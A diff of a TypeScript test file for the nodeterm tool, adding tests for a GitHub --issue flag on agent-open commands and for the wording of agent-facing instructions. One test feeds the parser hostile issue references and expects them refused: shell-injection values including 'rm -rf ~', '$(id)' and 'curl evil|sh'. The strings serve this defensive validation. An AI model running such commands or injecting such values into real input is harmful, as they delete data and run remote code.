@@ -353,6 +353,22 @@ describe('parseControlRequest', () => {
     expect(body.toLowerCase()).toContain('confirm')
   })
 
+  // `assign` with no `--before` used to append at the bottom of the column — a card an agent had
+  // just moved into a long Done column read as gone. It now lands at the TOP, and an agent reading
+  // either body must be told so (a doc that still says "end" is a stale contract).
+  it('both agent-facing texts say an unanchored assign lands at the TOP of the column', () => {
+    for (const body of [buildCanvasSkillBody('/x/shim.sh'), buildCanvasControlInstructions('/tmp/nodeterm.sh')]) {
+      // Anchored on the verb's own synopsis (`assign --node <id>`), not on the first mention of
+      // `assign --node`: the issue-bound contract, rendered earlier in both bodies, also tells a
+      // session to run `assign --node "$NODETERM_NODE_ID" …`.
+      const at = body.indexOf('assign --node <id>')
+      expect(at).toBeGreaterThan(-1)
+      const assign = body.slice(at, at + 900)
+      expect(assign).toMatch(/[Ww]ithout `--before`[^.]*\bTOP\b/)
+      expect(assign).not.toMatch(/\bat the end\b|\bappend/i)
+    }
+  })
+
   // The parser change in this commit's sibling is only half a fix: an agent that never learns the
   // `=` form simply cannot express a value beginning with `--`, and the failure stays silent for it.
   // So both agent-facing texts must carry the rule, not just one of them.
@@ -1109,5 +1125,81 @@ describe('trigger wording does not claim in-process subagent requests (issue #91
     const skill = buildCanvasSkillBody('/x/shim.sh')
     expect(skill).not.toMatch(/2–5 independent workstreams/)
     expect(skill).toMatch(/independent workstreams step 0 identified/)
+  })
+})
+
+describe('--issue: GitHub issue-bound sessions', () => {
+  it('accepts owner/repo#N and #N on the two agent-open verbs', () => {
+    expect(parseControlRequest('open-agent', { agent: 'claude', issue: 'eneskirca/nodeterm#42' })).toEqual({
+      verb: 'open-agent',
+      args: { agent: 'claude', issue: 'eneskirca/nodeterm#42' }
+    })
+    expect(parseControlRequest('open-claude', { issue: '#7' })).toMatchObject({ verb: 'open-claude' })
+  })
+
+  it.each([
+    'o/r#1; rm -rf ~',
+    'o/r#`id`',
+    'o/r#$(id)',
+    '$(id)/r#1',
+    'o/r#1\nrm -rf ~',
+    '#1 && curl evil|sh',
+    'o/r',
+    ''
+  ])('refuses a hostile or malformed reference %j before any shell sees it', (issue) => {
+    const r = parseControlRequest('open-agent', { agent: 'claude', issue })
+    expect(r).toHaveProperty('error')
+    expect((r as { error: string }).error).toMatch(/^open-agent: --issue must be/)
+  })
+
+  it('refuses --issue on a verb that cannot read an issue, rather than silently ignoring it', () => {
+    expect(parseControlRequest('open-terminal', { issue: '#1' })).toEqual({
+      error: 'open-terminal: --issue applies only to open-agent / open-claude (an agent session reads the issue itself)'
+    })
+    expect(parseControlRequest('assign', { node: 'n1', issue: '#1' })).toHaveProperty('error')
+  })
+
+  // The skill and the marker block are what an agent actually reads. Walk BOTH, and red on any
+  // clause of the contract that goes missing — a doc line with no test is a plan, not a fact.
+  const bodies: Array<[string, string]> = [
+    ['skill body', buildCanvasSkillBody('/x/nodeterm.sh')],
+    ['instructions block', buildCanvasControlInstructions('/x/nodeterm.sh')]
+  ]
+
+  it.each(bodies)('%s documents the flag on both open verbs', (_name, body) => {
+    expect(body).toMatch(/open-claude [^\n]*\[--issue <owner\/repo#N \| #N>\]/)
+    expect(body).toMatch(/open-agent --agent [^\n]*\[--issue <owner\/repo#N \| #N>\]/)
+  })
+
+  it.each(bodies)('%s states the reference-only launch prompt, rendered from the real composer', (_name, body) => {
+    expect(body).toContain('carries ONLY the reference, never the issue\'s')
+    expect(body).toContain('You are working on GitHub issue owner/repo#123.')
+    expect(body).toContain('gh issue view 123 --repo owner/repo --comments')
+    expect(body).toMatch(/with no repository configured it is\s+refused/)
+    // A board start (and a bare `--issue` open) means WORK ON IT; a `--prompt` replaces the task.
+    const flat = body.replace(/\s+/g, ' ')
+    expect(flat).toContain('Then work on it: investigate, plan and implement the fix in this working tree.')
+    expect(flat).toContain('`--prompt` REPLACES that task')
+    expect(flat).toContain('the issue IS your task: read it, then investigate, plan and implement the fix')
+    // The rendered example is the real prompt, limits included.
+    expect(flat).toContain('Never close the issue. Do not post issue comments or open pull requests unless the user asks')
+  })
+
+  it.each(bodies)('%s pins the status + write-back contract', (_name, body) => {
+    const flat = body.replace(/\s+/g, ' ')
+    expect(flat).toContain('assign --node "$NODETERM_NODE_ID" --column "In Progress"')
+    expect(flat).toContain('--column "In Review"')
+    expect(flat).toContain('never Done')
+    expect(flat).toContain('Never close the GitHub issue and never move a card to Done: done stays human.')
+    expect(flat).toContain('Closes #N')
+    expect(flat).toContain('Posting to GitHub is outward-facing and PUBLIC.')
+    expect(flat).toContain('ONLY when the user asked for it in this session')
+    expect(flat).toContain('otherwise end with a proposed comment the user can post')
+    expect(flat).toContain('The end of a turn moves nothing')
+  })
+
+  it.each(bodies)('%s never promises an automatic post to GitHub', (_name, body) => {
+    expect(body).not.toMatch(/automatically (post|comment|close)/i)
+    expect(body).not.toMatch(/nodeterm (posts|comments|closes)/i)
   })
 })
